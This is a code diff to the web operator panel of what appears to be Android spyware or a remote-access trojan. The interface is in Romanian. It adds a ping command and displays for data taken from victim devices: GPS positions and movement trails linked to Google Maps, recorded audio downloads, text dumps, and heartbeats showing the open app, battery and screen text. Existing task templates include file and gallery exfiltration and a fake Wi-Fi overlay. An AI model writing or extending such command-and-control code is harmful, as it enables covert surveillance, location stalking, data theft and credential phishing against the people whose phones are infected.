@@ -1433,6 +1433,7 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 </div>
 <div class="form-row"><div style="flex:3"><label class="lbl">Parametri (JSON)</label><textarea id="cmdParams" rows="3" class="mono">{}</textarea></div></div>
 <button onclick="sendCmd()">TRIMITE COMANDĂ</button>
+<button class="sec" style="margin-left:8px" onclick="sendPing()">Testare</button>
 <span id="cmdStatus" style="margin-left:12px;color:var(--dim);font-size:12px"></span>
 </div>
 
@@ -1464,6 +1465,14 @@ function updParams(){
   notifications:{},exfil_file:{uri:""},exfil_gallery:{limit:10,since:null},overlay:{type:"wifi",title:"",body:""},ping:{},kill:{},status:{}};
   document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
 }
+async function sendPing(){
+  const uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
+  document.getElementById("cmdStatus").textContent="ping…";
+  try{const r=await api("/admin/api/c2/cmd",{method:"POST",body:{uid,tasks:[{action:"ping",params:{}}]}});
+    document.getElementById("cmdStatus").textContent=r.ok?"✓ ping trimis":"eroare";
+    setTimeout(loadDetail,1500);
+  }catch(e){document.getElementById("cmdStatus").textContent="eroare: "+e.message}
+}
 async function sendCmd(){
   const uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
   const action=document.getElementById("cmdAction").value;
@@ -1479,9 +1488,15 @@ function fmtData(d){
   if(!d)return"";
   if(typeof d==="string")return esc(d.slice(0,500));
   if(d.b64)return'<img class="shot" src="data:'+(d.ct||"image/jpeg")+';base64,'+d.b64+'">';
-  if(d.file)return"📁 <a href='#' onclick='dl(\""+esc(d.file)+"\");return false'>"+esc(d.file)+"</a>";
+  if(d.lat!=null&&d.lng!=null)return"📍 "+d.lat.toFixed(5)+", "+d.lng.toFixed(5)+(d.acc?" (±"+d.acc.toFixed(0)+"m)":"")+' <a target="_blank" href="https://maps.google.com/?q='+d.lat+','+d.lng+'">harta →</a>';
+  if(d.path&&d.points>1){const pts=d.path.split(" ");const first=pts[0],last=pts[pts.length-1];return"📍 "+d.points+" puncte · <a target='_blank' href='https://maps.google.com/dir/"+first+"/"+last+"'>traseu →</a><pre>"+esc(pts.join("\n"))+"</pre>"}
+  if(d.file){const isAud=/\.m4a|\.mp3|\.wav|audio\//i.test(d.file);return(isAud?"🎵 ":"📁 ")+'<a href="#" onclick=\'dl("'+esc(d.file)+'");return false\'>descarcă</a>'+(d.size?" ("+(d.size/1024).toFixed(1)+"KB)":"")}
   if(d.files){const f=d.files.map(function(x){return"<a href='#' onclick='dl(\""+esc(x)+"\");return false'>"+esc(x.split("/").pop())+"</a>"}).join(", ");return"📁 "+f}
-  return esc(JSON.stringify(d).slice(0,1000));
+  if(d.text)return"<pre style='max-height:200px'>"+esc(d.text.slice(0,3000))+"</pre>";
+  if(d.entries){return"<pre style='max-height:200px'>"+esc(d.entries.join("\n"))+"</pre>"}
+  if(d.list&&d.list.length){return"<pre style='max-height:200px'>"+esc(JSON.stringify(d.list.slice(0,30),null,1))+"</pre>"}
+  if(d.hb)return"💓 "+(d.fg?"app: "+esc(d.fg)+" · ":"")+(d.bat>=0?"bată: "+esc(d.bat)+"%":"")+(d.screen?"\n<pre>"+esc(d.screen.slice(0,300))+"</pre>":"");
+  return"<pre>"+esc(JSON.stringify(d).slice(0,1500))+"</pre>";
 }
 async function loadAll(){
   const now=Math.floor(Date.now()/1000);
